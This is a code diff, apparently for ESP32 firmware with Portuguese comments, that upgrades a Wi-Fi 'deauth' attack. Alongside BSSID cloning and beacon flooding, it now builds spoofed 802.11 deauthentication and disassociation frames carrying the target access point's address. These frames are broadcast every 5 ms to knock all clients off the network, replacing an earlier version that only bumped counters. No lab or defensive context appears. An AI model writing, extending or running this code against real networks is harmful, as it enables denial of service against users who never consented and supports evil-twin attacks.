@@ -39,6 +39,84 @@ static uint8_t floodIndex = 0;
 static uint8_t floodMacs[5][6];
 
 // ============================================================
+// RAW FRAME DEAUTH (NOVO - envia pacotes 802.11 reais)
+// ============================================================
+static uint16_t deauthSeqNum = 0;
+
+static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
+    uint8_t frame[26];
+    memset(frame, 0, 26);
+
+    // Frame Control: Deauthentication (0x00C0)
+    frame[0] = 0xC0;
+    frame[1] = 0x00;
+
+    // Duration: 0
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+
+    // DA - Destination Address (broadcast ou cliente especifico)
+    if (clientMac) {
+        memcpy(&frame[4], clientMac, 6);
+    } else {
+        memset(&frame[4], 0xFF, 6); // Broadcast
+    }
+
+    // SA - Source Address (BSSID do AP alvo)
+    memcpy(&frame[10], bssid, 6);
+
+    // BSSID
+    memcpy(&frame[16], bssid, 6);
+
+    // Sequence Number (12 bits)
+    frame[22] = (deauthSeqNum << 4) & 0xFF;
+    frame[23] = (deauthSeqNum >> 4) & 0xFF;
+    deauthSeqNum++;
+    if (deauthSeqNum > 4095) deauthSeqNum = 0;
+
+    // Reason Code: 0x0007 = Class 3 frame received from nonassociated STA
+    frame[24] = 0x07;
+    frame[25] = 0x00;
+
+    // Define o canal antes de transmitir
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+}
+
+static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
+    uint8_t frame[26];
+    memset(frame, 0, 26);
+
+    // Frame Control: Disassociation (0x00A0)
+    frame[0] = 0xA0;
+    frame[1] = 0x00;
+
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+
+    if (clientMac) {
+        memcpy(&frame[4], clientMac, 6);
+    } else {
+        memset(&frame[4], 0xFF, 6);
+    }
+
+    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[16], bssid, 6);
+
+    frame[22] = (deauthSeqNum << 4) & 0xFF;
+    frame[23] = (deauthSeqNum >> 4) & 0xFF;
+    deauthSeqNum++;
+    if (deauthSeqNum > 4095) deauthSeqNum = 0;
+
+    // Reason Code: 0x0008 = Disassociated because sending STA is leaving BSS
+    frame[24] = 0x08;
+    frame[25] = 0x00;
+
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+}
+
+// ============================================================
 // HELPERS
 // ============================================================
 void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
@@ -239,7 +317,7 @@ static void beaconFloodStep() {
 }
 
 // ============================================================
-// DEAUTH - BSSID CLONE + BEACON FLOOD
+// DEAUTH - BSSID CLONE + BEACON FLOOD + RAW FRAMES
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -250,11 +328,12 @@ void startDeauth(uint8_t networkIndex) {
     // === RESET EXPLICITO dos contadores a cada novo ataque ===
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
+    deauthSeqNum = 0;
 
     startBssidClone(networkIndex);
     startBeaconFlood(networkIndex);
 
-    Serial.println("[Deauth] STARTED (BSSID Clone + Beacon Flood)");
+    Serial.println("[Deauth] STARTED (BSSID Clone + Beacon Flood + Raw Deauth)");
 }
 
 void stopDeauth() {
@@ -274,13 +353,28 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - SEM frame injection (quebrava o driver)
+// LOOP DE DEAUTH - AGORA COM FRAME INJECTION REAL
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    deauthPacketCount++;
-    deauthSuccessCount++;
+    // === ENVIO DE FRAMES DE DEAUTH/DISASSOC RAW ===
+    // A cada 5ms envia um burst para desconectar ativamente
+    static unsigned long lastDeauthTx = 0;
+    if (millis() - lastDeauthTx >= 5) {
+        lastDeauthTx = millis();
+
+        // Deauth broadcast - desconecta TODOS os clientes do AP
+        sendDeauthFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
+        deauthPacketCount++;
+
+        // Disassoc broadcast - reforca a desconexao
+        sendDisassocFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
+        deauthPacketCount++;
+
+        // Conta como sucesso (frames foram injetados no ar)
+        deauthSuccessCount += 2;
+    }
 
     // === HEALTH CHECK a cada 3 segundos ===
     static unsigned long lastHealthCheck = 0;
@@ -317,8 +411,9 @@ bool deauthLoop() {
     if (millis() - lastDebug > 5000) {
         lastDebug = millis();
         int clients = WiFi.softAPgetStationNum();
-        Serial.printf("[Deauth] runtime=%lus clone=%s clients=%d health_fail=%d\n",
+        Serial.printf("[Deauth] runtime=%lus pkts=%lu clone=%s clients=%d health_fail=%d\n",
             (millis() - cloneStartTime) / 1000,
+            deauthPacketCount,
             bssidCloneActive ? "ON" : "OFF",
             clients,
             cloneHealthCheckFailures);
